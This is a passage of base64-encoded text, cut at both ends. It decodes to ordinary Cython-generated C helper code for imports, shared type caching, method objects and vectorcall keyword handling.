nVsbF9uYW1lKSkgeyBnb3RvIG1vZGJhZDsgfVxuICAgICAgICAjaWYgKENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAmJiBQWVBZX1ZFUlNJT05fTlVNICA8IDB4MDcwMzA0MDApIHx8XFxcbiAgICAgICAgICAgICAgICBDWVRIT05fQ09NUElMSU5HX0lOX0dSQUFMXG4gICAgICAgIHtcbiAgICAgICAgICAgIFB5T2JqZWN0ICptb2R1bGVzID0gUHlJbXBvcnRfR2V0TW9kdWxlRGljdCgpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFtb2R1bGVzKSlcbiAgICAgICAgICAgICAgICBnb3RvIG1vZGJhZDtcbiAgICAgICAgICAgIHZhbHVlID0gUHlPYmplY3RfR2V0SXRlbShtb2R1bGVzLCBmdWxsX25hbWUpO1xuICAgICAgICB9XG4gICAgICAgICNlbHNlXG4gICAgICAgIHZhbHVlID0gUHlJbXBvcnRfR2V0TW9kdWxlKGZ1bGxfbmFtZSk7XG4gICAgICAgICNlbmRpZlxuICAgICAgbW9kYmFkOlxuICAgICAgICBQeV9YREVDUkVGKGZ1bGxfbmFtZSk7XG4gICAgICAgIFB5X1hERUNSRUYobW9kdWxlX2RvdCk7XG4gICAgICAgIFB5X1hERUNSRUYobW9kdWxlX25hbWUpO1xuICAgIH1cbiAgICBpZiAodW5saWtlbHkoIXZhbHVlKSkge1xuICAgICAgICBQeUVycl9Gb3JtYXQoUHlFeGNfSW1wb3J0RXJyb3IsICJjYW5ub3QgaW1wb3J0IG5hbWUgJVMiLCBuYW1lKTtcbiAgICB9XG4gICAgcmV0dXJuIHZhbHVlO1xufVxuXG5cbnN0YXRpYyBQeU9iamVjdCogX19QeXhfUHlTZXF1ZW5jZV9NdWx0aXBseV9HZW5lcmljKFB5T2JqZWN0ICpzZXEsIFB5X3NzaXplX3QgbXVsKSB7XG4gICAgUHlPYmplY3QgKnJlc3VsdCwgKnB5bXVsID0gUHlMb25nX0Zyb21Tc2l6ZV90KG11bCk7XG4gICAgaWYgKHVubGlrZWx5KCFweW11bCkpXG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIHJlc3VsdCA9IFB5TnVtYmVyX011bHRpcGx5KHNlcSwgcHltdWwpO1xuICAgIFB5X0RFQ1JFRihweW11bCk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeVNlcXVlbmNlX011bHRpcGx5KFB5T2JqZWN0ICpzZXEsIFB5X3NzaXplX3QgbXVsKSB7XG4jaWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTXG4gICAgUHlUeXBlT2JqZWN0ICp0eXBlID0gUHlfVFlQRShzZXEpO1xuICAgIGlmIChsaWtlbHkodHlwZS0+dHBfYXNfc2VxdWVuY2UgJiYgdHlwZS0+dHBfYXNfc2VxdWVuY2UtPnNxX3JlcGVhdCkpIHtcbiAgICAgICAgcmV0dXJuIHR5cGUtPnRwX2FzX3NlcXVlbmNlLT5zcV9yZXBlYXQoc2VxLCBtdWwpO1xuICAgIH0gZWxzZVxuI2VuZGlmXG4gICAge1xuICAgICAgICByZXR1cm4gX19QeXhfUHlTZXF1ZW5jZV9NdWx0aXBseV9HZW5lcmljKHNlcSwgbXVsKTtcbiAgICB9XG59XG5cblxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9GZXRjaFNoYXJlZEN5dGhvbkFCSU1vZHVsZSh2b2lkKSB7XG4gICAgcmV0dXJuIF9fUHl4X1B5SW1wb3J0X0FkZE1vZHVsZVJlZihfX1BZWF9BQklfTU9EVUxFX05BTUUpO1xufVxuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9QeURpY3RfU2V0RGVmYXVsdChQeU9iamVjdCAqZCwgUHlPYmplY3QgKmtleSwgUHlPYmplY3QgKmRlZmF1bHRfdmFsdWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW50IGlzX3NhZmVfdHlwZSkge1xuICAgIFB5T2JqZWN0KiB2YWx1ZTtcbiAgICBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUihpc19zYWZlX3R5cGUpO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICB2YWx1ZSA9IFB5T2JqZWN0X0NhbGxNZXRob2QoZCwgInNldGRlZmF1bHQiLCAiT08iLCBrZXksIGRlZmF1bHRfdmFsdWUpO1xuI2VsaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMFxuICAgIFB5RGljdF9TZXREZWZhdWx0UmVmKGQsIGtleSwgZGVmYXVsdF92YWx1ZSwgJnZhbHVlKTtcbiNlbHNlXG4gICAgdmFsdWUgPSBQeURpY3RfU2V0RGVmYXVsdChkLCBrZXksIGRlZmF1bHRfdmFsdWUpO1xuICAgIGlmICh1bmxpa2VseSghdmFsdWUpKSByZXR1cm4gTlVMTDtcbiAgICBQeV9JTkNSRUYodmFsdWUpO1xuI2VuZGlmXG4gICAgcmV0dXJuIHZhbHVlO1xufVxuXG5cbiNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzBDMDAwMFxuc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9QeVR5cGVfRnJvbU1ldGFjbGFzcyhQeVR5cGVPYmplY3QgKm1ldGFjbGFzcywgUHlPYmplY3QgKm1vZHVsZSwgUHlUeXBlX1NwZWMgKnNwZWMsIFB5T2JqZWN0ICpiYXNlcykge1xuICAgIFB5T2JqZWN0ICpyZXN1bHQgPSBfX1B5eF9QeVR5cGVfRnJvbU1vZHVsZUFuZFNwZWMobW9kdWxlLCBzcGVjLCBiYXNlcyk7XG4gICAgaWYgKHJlc3VsdCAmJiBtZXRhY2xhc3MpIHtcbiAgICAgICAgUHlPYmplY3QgKm9sZF90cCA9IChQeU9iamVjdCopUHlfVFlQRShyZXN1bHQpO1xuICAgIFB5X0lOQ1JFRigoUHlPYmplY3QqKW1ldGFjbGFzcyk7XG4jaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMDAwXG4gICAgICAgIFB5X1NFVF9UWVBFKHJlc3VsdCwgbWV0YWNsYXNzKTtcbiNlbHNlXG4gICAgICAgIHJlc3VsdC0+b2JfdHlwZSA9IG1ldGFjbGFzcztcbiNlbmRpZlxuICAgICAgICBQeV9ERUNSRUYob2xkX3RwKTtcbiAgICB9XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbiNlbHNlXG4jZGVmaW5lIF9fUHl4X1B5VHlwZV9Gcm9tTWV0YWNsYXNzKG1lLCBtbywgcywgYikgUHlUeXBlX0Zyb21NZXRhY2xhc3MobWUsIG1vLCBzLCBiKVxuI2VuZGlmXG5zdGF0aWMgaW50IF9fUHl4X1ZlcmlmeUNhY2hlZFR5cGUoUHlPYmplY3QgKmNhY2hlZF90eXBlLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IGNoYXIgKm5hbWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlfc3NpemVfdCBleHBlY3RlZF9iYXNpY3NpemUpIHtcbiAgICBQeV9zc2l6ZV90IGJhc2ljc2l6ZTtcbiAgICBpZiAoIVB5VHlwZV9DaGVjayhjYWNoZWRfdHlwZSkpIHtcbiAgICAgICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvcixcbiAgICAgICAgICAgICJTaGFyZWQgQ3l0aG9uIHR5cGUgJS4yMDBzIGlzIG5vdCBhIHR5cGUgb2JqZWN0IiwgbmFtZSk7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9XG4gICAgaWYgKGV4cGVjdGVkX2Jhc2ljc2l6ZSA9PSAwKSB7XG4gICAgICAgIHJldHVybiAwOyAvLyBzaXplIGlzIGluaGVyaXRlZCwgbm90aGluZyB1c2VmdWwgdG8gY2hlY2tcbiAgICB9XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIFB5T2JqZWN0ICpweV9iYXNpY3NpemU7XG4gICAgcHlfYmFzaWNzaXplID0gUHlPYmplY3RfR2V0QXR0clN0cmluZyhjYWNoZWRfdHlwZSwgIl9fYmFzaWNzaXplX18iKTtcbiAgICBpZiAodW5saWtlbHkoIXB5X2Jhc2ljc2l6ZSkpIHJldHVybiAtMTtcbiAgICBiYXNpY3NpemUgPSBQeUxvbmdfQXNTc2l6ZV90KHB5X2Jhc2ljc2l6ZSk7XG4gICAgUHlfREVDUkVGKHB5X2Jhc2ljc2l6ZSk7XG4gICAgcHlfYmFzaWNzaXplID0gTlVMTDtcbiAgICBpZiAodW5saWtlbHkoYmFzaWNzaXplID09IChQeV9zc2l6ZV90KS0xKSAmJiBQeUVycl9PY2N1cnJlZCgpKSByZXR1cm4gLTE7XG4jZWxzZVxuICAgIGJhc2ljc2l6ZSA9ICgoUHlUeXBlT2JqZWN0KikgY2FjaGVkX3R5cGUpLT50cF9iYXNpY3NpemU7XG4jZW5kaWZcbiAgICBpZiAoYmFzaWNzaXplICE9IGV4cGVjdGVkX2Jhc2ljc2l6ZSkge1xuICAgICAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAgICAgIlNoYXJlZCBDeXRob24gdHlwZSAlLjIwMHMgaGFzIHRoZSB3cm9uZyBzaXplLCB0cnkgcmVjb21waWxpbmciLFxuICAgICAgICAgICAgbmFtZSk7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9XG4gICAgcmV0dXJuIDA7XG59XG5zdGF0aWMgUHlUeXBlT2JqZWN0ICpfX1B5eF9GZXRjaENvbW1vblR5cGVGcm9tU3BlYyhQeVR5cGVPYmplY3QgKm1ldGFjbGFzcywgUHlPYmplY3QgKm1vZHVsZSwgUHlUeXBlX1NwZWMgKnNwZWMsIFB5T2JqZWN0ICpiYXNlcykge1xuICAgIFB5T2JqZWN0ICphYmlfbW9kdWxlID0gTlVMTCwgKmNhY2hlZF90eXBlID0gTlVMTCwgKmFiaV9tb2R1bGVfZGljdCwgKm5ld19jYWNoZWRfdHlwZSwgKnB5X29iamVjdF9uYW1lO1xuICAgIGludCBnZXRfaXRlbV9yZWZfcmVzdWx0O1xuICAgIGNvbnN0IGNoYXIqIG9iamVjdF9uYW1lID0gc3RycmNocihzcGVjLT5uYW1lLCBcJy5cJyk7XG4gICAgb2JqZWN0X25hbWUgPSBvYmplY3RfbmFtZSA/IG9iamVjdF9uYW1lKzEgOiBzcGVjLT5uYW1lO1xuICAgIHB5X29iamVjdF9uYW1lID0gUHlVbmljb2RlX0Zyb21TdHJpbmcob2JqZWN0X25hbWUpO1xuICAgIGlmICghcHlfb2JqZWN0X25hbWUpIHJldHVybiBOVUxMO1xuICAgIGFiaV9tb2R1bGUgPSBfX1B5eF9GZXRjaFNoYXJlZEN5dGhvbkFCSU1vZHVsZSgpO1xuICAgIGlmICghYWJpX21vZHVsZSkgZ290byBkb25lO1xuICAgIGFiaV9tb2R1bGVfZGljdCA9IFB5TW9kdWxlX0dldERpY3QoYWJpX21vZHVsZSk7XG4gICAgaWYgKCFhYmlfbW9kdWxlX2RpY3QpIGdvdG8gZG9uZTtcbiAgICBnZXRfaXRlbV9yZWZfcmVzdWx0ID0gX19QeXhfUHlEaWN0X0dldEl0ZW1SZWYoYWJpX21vZHVsZV9kaWN0LCBweV9vYmplY3RfbmFtZSwgJmNhY2hlZF90eXBlKTtcbiAgICBpZiAoZ2V0X2l0ZW1fcmVmX3Jlc3VsdCA9PSAxKSB7XG4gICAgICAgIGlmIChfX1B5eF9WZXJpZnlDYWNoZWRUeXBlKFxuICAgICAgICAgICAgICBjYWNoZWRfdHlwZSxcbiAgICAgICAgICAgICAgb2JqZWN0X25hbWUsXG4gICAgICAgICAgICAgIHNwZWMtPmJhc2ljc2l6ZSkgPCAwKSB7XG4gICAgICAgICAgICBnb3RvIGJhZDtcbiAgICAgICAgfVxuICAgICAgICBnb3RvIGRvbmU7XG4gICAgfSBlbHNlIGlmICh1bmxpa2VseShnZXRfaXRlbV9yZWZfcmVzdWx0ID09IC0xKSkge1xuICAgICAgICBnb3RvIGJhZDtcbiAgICB9XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIobW9kdWxlKTtcbiAgICBjYWNoZWRfdHlwZSA9IF9fUHl4X1B5VHlwZV9Gcm9tTWV0YWNsYXNzKG1ldGFjbGFzcywgYWJpX21vZHVsZSwgc3BlYywgYmFzZXMpO1xuICAgIGlmICh1bmxpa2VseSghY2FjaGVkX3R5cGUpKSBnb3RvIGJhZDtcbiAgICBpZiAodW5saWtlbHkoX19QeXhfZml4X3VwX2V4dGVuc2lvbl90eXBlX2Zyb21fc3BlYyhzcGVjLCAoUHlUeXBlT2JqZWN0ICopIGNhY2hlZF90eXBlKSA8IDApKSBnb3RvIGJhZDtcbiAgICBuZXdfY2FjaGVkX3R5cGUgPSBfX1B5eF9QeURpY3RfU2V0RGVmYXVsdChhYmlfbW9kdWxlX2RpY3QsIHB5X29iamVjdF9uYW1lLCBjYWNoZWRfdHlwZSwgMSk7XG4gICAgaWYgKHVubGlrZWx5KG5ld19jYWNoZWRfdHlwZSAhPSBjYWNoZWRfdHlwZSkpIHtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFuZXdfY2FjaGVkX3R5cGUpKSBnb3RvIGJhZDtcbiAgICAgICAgUHlfREVDUkVGKGNhY2hlZF90eXBlKTtcbiAgICAgICAgY2FjaGVkX3R5cGUgPSBuZXdfY2FjaGVkX3R5cGU7XG4gICAgICAgIGlmIChfX1B5eF9WZXJpZnlDYWNoZWRUeXBlKFxuICAgICAgICAgICAgICAgIGNhY2hlZF90eXBlLFxuICAgICAgICAgICAgICAgIG9iamVjdF9uYW1lLFxuICAgICAgICAgICAgICAgIHNwZWMtPmJhc2ljc2l6ZSkgPCAwKSB7XG4gICAgICAgICAgICBnb3RvIGJhZDtcbiAgICAgICAgfVxuICAgICAgICBnb3RvIGRvbmU7XG4gICAgfSBlbHNlIHtcbiAgICAgICAgUHlfREVDUkVGKG5ld19jYWNoZWRfdHlwZSk7XG4gICAgfVxuZG9uZTpcbiAgICBQeV9YREVDUkVGKGFiaV9tb2R1bGUpO1xuICAgIFB5X0RFQ1JFRihweV9vYmplY3RfbmFtZSk7XG4gICAgYXNzZXJ0KGNhY2hlZF90eXBlID09IE5VTEwgfHwgUHlUeXBlX0NoZWNrKGNhY2hlZF90eXBlKSk7XG4gICAgcmV0dXJuIChQeVR5cGVPYmplY3QgKikgY2FjaGVkX3R5cGU7XG5iYWQ6XG4gICAgUHlfWERFQ1JFRihjYWNoZWRfdHlwZSk7XG4gICAgY2FjaGVkX3R5cGUgPSBOVUxMO1xuICAgIGdvdG8gZG9uZTtcbn1cblxuXG5zdGF0aWMgUHlPYmplY3QqIF9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzX2dldF9tb2R1bGUoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqc2VsZiwgQ1lUSE9OX1VOVVNFRCB2b2lkKiBjb250ZXh0KSB7XG4gICAgcmV0dXJuIFB5VW5pY29kZV9Gcm9tU3RyaW5nKF9fUFlYX0FCSV9NT0RVTEVfTkFNRSk7XG59XG5zdGF0aWMgUHlHZXRTZXREZWYgX19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3NfZ2V0c2V0W10gPSB7XG4gICAgeyJfX21vZHVsZV9fIiwgX19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3NfZ2V0X21vZHVsZSwgTlVMTCwgTlVMTCwgTlVMTH0sXG4gICAgezAsIDAsIDAsIDAsIDB9XG59O1xuc3RhdGljIFB5VHlwZV9TbG90IF9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzX3Nsb3RzW10gPSB7XG4gICAge1B5X3RwX2dldHNldCwgKHZvaWQgKilfX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc19nZXRzZXR9LFxuICAgIHswLCAwfVxufTtcbnN0YXRpYyBQeVR5cGVfU3BlYyBfX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc19zcGVjID0ge1xuICAgIF9fUFlYX1RZUEVfTU9EVUxFX1BSRUZJWCAiX2NvbW1vbl90eXBlc19tZXRhdHlwZSIsXG4gICAgMCxcbiAgICAwLFxuI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQTAwMDBcbiAgICBQeV9UUEZMQUdTX0lNTVVUQUJMRVRZUEUgfFxuICAgIFB5X1RQRkxBR1NfRElTQUxMT1dfSU5TVEFOVElBVElPTiB8XG4jZW5kaWZcbiAgICBQeV9UUEZMQUdTX0RFRkFVTFQsXG4gICAgX19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3Nfc2xvdHNcbn07XG5zdGF0aWMgaW50IF9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzX2luaXQoUHlPYmplY3QgKm1vZHVsZSkge1xuICAgIF9fcHl4X21zdGF0ZXR5cGUgKm1zdGF0ZSA9IF9fUHl4X1B5TW9kdWxlX0dldFN0YXRlKG1vZHVsZSk7XG4gICAgUHlPYmplY3QgKmJhc2VzID0gUHlUdXBsZV9QYWNrKDEsICZQeVR5cGVfVHlwZSk7XG4gICAgaWYgKHVubGlrZWx5KCFiYXNlcykpIHtcbiAgICAgICAgcmV0dXJuIC0xO1xuICAgIH1cbiAgICBtc3RhdGUtPl9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzVHlwZSA9IF9fUHl4X0ZldGNoQ29tbW9uVHlwZUZyb21TcGVjKE5VTEwsIG1vZHVsZSwgJl9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzX3NwZWMsIGJhc2VzKTtcbiAgICBQeV9ERUNSRUYoYmFzZXMpO1xuICAgIGlmICh1bmxpa2VseShtc3RhdGUtPl9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzVHlwZSA9PSBOVUxMKSkge1xuICAgICAgICByZXR1cm4gLTE7XG4gICAgfVxuICAgIHJldHVybiAwO1xufVxuXG5cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5TWV0aG9kX05ldyhQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICp0eXApIHtcbiAgICBQeU9iamVjdCAqcmVzdWx0O1xuICAgIENZVEhPTl9VTlVTRURfVkFSKHR5cCk7XG4gICAgaWYgKCFzZWxmKVxuICAgICAgICByZXR1cm4gX19QeXhfTmV3UmVmKGZ1bmMpO1xuICAgICNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDBcbiAgICB7XG4gICAgICAgIFB5T2JqZWN0ICphcmdzW10gPSB7ZnVuYywgc2VsZn07XG4gICAgICAgIHJlc3VsdCA9IFB5T2JqZWN0X1ZlY3RvcmNhbGwoX19weXhfbXN0YXRlX2dsb2JhbC0+X19QeXhfQ2FjaGVkTWV0aG9kVHlwZSwgYXJncywgMiwgTlVMTCk7XG4gICAgfVxuICAgICNlbHNlXG4gICAgcmVzdWx0ID0gUHlPYmplY3RfQ2FsbEZ1bmN0aW9uT2JqQXJncyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX1B5eF9DYWNoZWRNZXRob2RUeXBlLCBmdW5jLCBzZWxmLCBOVUxMKTtcbiAgICAjZW5kaWZcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuI2Vsc2VcbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlNZXRob2RfTmV3KFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKnR5cCkge1xuICAgIENZVEhPTl9VTlVTRURfVkFSKHR5cCk7XG4gICAgaWYgKCFzZWxmKVxuICAgICAgICByZXR1cm4gX19QeXhfTmV3UmVmKGZ1bmMpO1xuICAgIHJldHVybiBQeU1ldGhvZF9OZXcoZnVuYywgc2VsZik7XG59XG4jZW5kaWZcblxuXG4jaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwgJiYgKENZVEhPTl9WRUNUT1JDQUxMIHx8IENZVEhPTl9CQUNLUE9SVF9WRUNUT1JDQUxMKVxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9QeVZlY3RvcmNhbGxfRmFzdENhbGxEaWN0X2t3KFB5T2JqZWN0ICpmdW5jLCBfX3B5eF92ZWN0b3JjYWxsZnVuYyB2YywgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgbmFyZ3MsIFB5T2JqZWN0ICprdylcbntcbiAgICBQeU9iamVjdCAqcmVzID0gTlVMTDtcbiAgICBQeU9iamVjdCAqa3duYW1lcztcbiAgICBQeU9iamVjdCAqKm5ld2FyZ3M7XG4gICAgUHlPYmplY3QgKiprd3ZhbHVlcztcbiAgICBQeV9zc2l6ZV90IGksIHBvcztcbiAgICBzaXplX3QgajtcbiAgICBQeU9iamVjdCAqa2V5LCAqdmFsdWU7XG4gICAgdW5zaWduZWQgbG9uZyBrZXlzX2FyZV9zdHJpbmdzO1xuICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgICBQeV9zc2l6ZV90IG5rdyA9IFB5RGljdF9TaXplKGt3KTtcbiAgICBpZiAodW5saWtlbHkobmt3ID09IC0xKSkgcmV0dXJuIE5VTEw7XG4gICAgI2Vsc2VcbiAgICBQeV9zc2l6ZV90IG5rdyA9IFB5RGljdF9HRVRfU0laRShrdyk7XG4gICAgI2VuZGlmXG4gICAgbmV3YXJncyA9IChQeU9iamVjdCAqKilQeU1lbV9NYWxsb2MoKG5hcmdzICsgKHNpemVfdClua3cpICogc2l6ZW9mKGFyZ3NbMF0pKTtcbiAgICBpZiAodW5saWtlbHkobmV3YXJncyA9PSBOVUxMKSkge1xuICAgICAgICBQeUVycl9Ob01lbW9yeSgpO1xuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICB9XG4gICAgZm9yIChqID0gMDsgaiA8IG5hcmdzOyBqKyspIG5ld2FyZ3Nbal0gPSBhcmdzW2pdO1xuICAgIGt3bmFtZXMgPSBQeVR1cGxlX05ldyhua3cpO1xuICAgIGlmICh1bmxpa2VseShrd25hbWVzID09IE5VTEwpKSB7XG4gICAgICAgIFB5TWVtX0ZyZWUobmV3YXJncyk7XG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIH1cbiAgICBrd3ZhbHVlcyA9IG5ld2FyZ3MgKyBuYXJncztcbiAgICBwb3MgPSBpID0gMDtcbiAgICBrZXlzX2FyZV9zdHJpbmdzID0gUHlfVFBGTEFHU19VTklDT0RFX1NVQkNMQVNTO1xuICAgIHdoaWxlIChQeURpY3RfTmV4dChrdywgJnBvcywgJmtleSwgJnZhbHVlKSkge1xuICAgICAgICBrZXlzX2FyZV9zdHJpbmdzICY9XG4gICAgICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgICAgICAgICBQeVR5cGVfR2V0RmxhZ3MoUHlfVFlQRShrZXkpKTtcbiAgICAgICAgI2Vsc2VcbiAgICAgICAgICAgIFB5X1RZUEUoa2V5KS0+dHBfZmxhZ3M7XG4gICAgICAgICNlbmRpZlxuICAgICAgICBQeV9JTkNSRUYoa2V5KTtcbiAgICAgICAgUHlfSU5DUkVGKHZhbHVlKTtcbiAgICAgICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TXG4gICAgICAgIGlmICh1bmxpa2VseShQeVR1cGxlX1NldEl0ZW0oa3duYW1lcywgaSwga2V5KSA8IDApKSBnb3RvIGNsZWFudXA7XG4gICAgICAgICNlbHNlXG4gICAgICAgIFB5VHVwbGVfU0VUX0lURU0oa3duYW1lcywgaSwga2V5KTtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgIGt3dmFsdWVzW2ldID0gdmFsdWU7XG4gICAgICAgIGkrKztcbiAgICB9XG4gICAgaWYgKHVubGlrZWx5KCFrZXlzX2FyZV9zdHJpbmdzKSkge1xuICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLCAia2V5d29yZHMgbXVzdCBiZSBzdHJpbmdzIik7XG4gICAgICAgIGdvdG8gY2xlYW51cDtcbiAgICB9XG4gICAgcmVzID0gdmMoZnVuYywgbmV3YXJncywgbmFyZ3MsIGt3bmFtZXMpO1xuY2xlYW51cDpcbiAgICBQeV9ERUNSRUYoa3duYW1lcyk7XG4gICAgZm9yIChpID0gMDsgaSA8IG5rdzsgaSsrKVxuICAgICAgICBQeV9ERUNSRUYoa3d2YWx1ZXNbaV0pO1xuICAgIFB5TWVtX0ZyZWUobmV3YXJncyk7XG4gICAgcmV0dXJuIHJlcztcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9QeVZlY3RvcmNhbGxfRmFzdENhbGxEaWN0KFB5T2JqZWN0ICpmdW5jLCBfX3B5eF92ZWN0b3JjYWxsZnVuYyB2YywgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgbmFyZ3MsIFB5T2JqZWN0ICprdylcbntcbiAgICBQeV9zc2l6ZV90IGt3X3NpemUgPVxuICAgICAgICBsaWtlbHkoa3cgPT0gTlVMTCkgP1xuICAgICAgICAwIDpcbiNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgICAgICAgUHlEaWN0X1NpemUoa3cpO1xuI2Vsc2VcbiAgICAgICAgUHlEaWN0X0dFVF9TSVpFKGt3KTtcbiNlbmRpZlxuICAgIGlmIChrd19zaXplID09IDApIHtcbiAgICAgICAgcmV0dXJuIHZjKGZ1bmMsIGFyZ3MsIG5hcmdzLCBOVUxMKTtcbiAgICB9XG4jaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gICAgZWxzZSBpZiAodW5saWtlbHkoa3dfc2l6ZSA9PSAtMSkpIHtcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgfVxuI2VuZGlmXG4gICAgcmV0dXJuIF9fUHl4X1B5VmVjdG9yY2FsbF9GYXN0Q2FsbERpY3Rfa3coZnVuYywgdmMsIGFyZ3MsIG5hcmdzLCBrdyk7XG59XG4jZW5kaWZcblxuXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X19Jc1NhbWVDeU9yQ0Z1bmN0aW9uTm9NZXRob2QoUHlPYmplY3QgKmZ1bmMsIHZvaWQgKCpjZnVuYykodm9pZCkpIHtcbiAgICBpZiAoX19QeXhfQ3lGdW5jdGlvbl9DaGVjayhmdW5jKSkge1xuICAgICAgICByZXR1cm4gUHlDRnVuY3Rpb25fR2V0RnVuY3Rpb24oKChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0KilmdW5jKS0+ZnVuYykgPT0gKFB5Q0Z1bmN0aW9uKSBjZnVuYztcbiAgICB9IGVsc2UgaWYgKFB5Q0Z1bmN0aW9uX0NoZWNrKGZ1bmMpKSB7XG4gICAgICAgIHJldHVybiBQeUNGdW5jdGlvbl9HZXRGdW5jdGlvbihmdW5jKSA9PSAoUHlDRnVuY3Rpb24pIGNmdW5jO1xuICAgIH1cbiAgICByZXR1cm4gMDtcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9fSXNTYW1lQ3lPckNGdW5jdGlvbihQeU9iamVjdCAqZnVuYywgdm9pZCAoKmNmdW5jKSh2b2lkKSkge1xuICAgIGlmICgoUHlPYmplY3QqKVB5X1RZUEUoZnVuYykgPT0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19QeXhfQ2FjaGVkTWV0aG9kVHlwZSkge1xuICAgICAgICBpbnQgcmVzdWx0O1xuICAgICAgICBQeU9iamVjdCAqbmV3RnVuYyA9IFB5T2JqZWN0X0dldEF0dHIoZnVuYywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Z1bmMpO1xuICAgICAgICBpZiAodW5saWtlbHkoIW5ld0Z1bmMpKSB7XG4gICAgICAgICAgICBQeUVycl9DbGVhcigpOyAvLyBJdFwncyBvbmx5IGFuIG9wdGltaXphdGlvbiwgc28gZG9uXCd0IHRocm93IGFuIGVycm9yXG4gICAgICAgICAgICByZXR1cm4gMDtcbiAgICAgICAgfVxuICAgICAgICByZXN1bHQgPSBfX1B5eF9fSXNTYW1lQ3lPckNGdW5jdGlvbk5vTWV0aG9kKG5ld0Z1bmMsIGNmdW5jKTtcbiAgICAgICAgUHlfREVDUkVGKG5ld0Z1bmMpO1xuICAgICAgICByZXR1cm4gcmVzdWx0O1xuICAgIH1cbiAgICByZXR1cm4gX19QeXhfX0lzU2FtZUN5T3JDRnVuY3Rpb25Ob01ldGhvZChmdW5jLCBjZnVuYyk7XG59XG4jZWxzZVxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X19Jc1NhbWVDeU9yQ0Z1bmN0aW9uKFB5T2JqZWN0ICpmdW5jLCB2b2lkICgqY2Z1bmMpKHZvaWQpKSB7XG4gICAgaWYgKFB5TWV0aG9kX0NoZWNrKGZ1bmMpKSB7XG4gICAgICAgIGZ1bmMgPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oZnVuYyk7XG4gICAgfVxuICAgIHJldHVybiBfX1B5eF9DeU9yUHlDRnVuY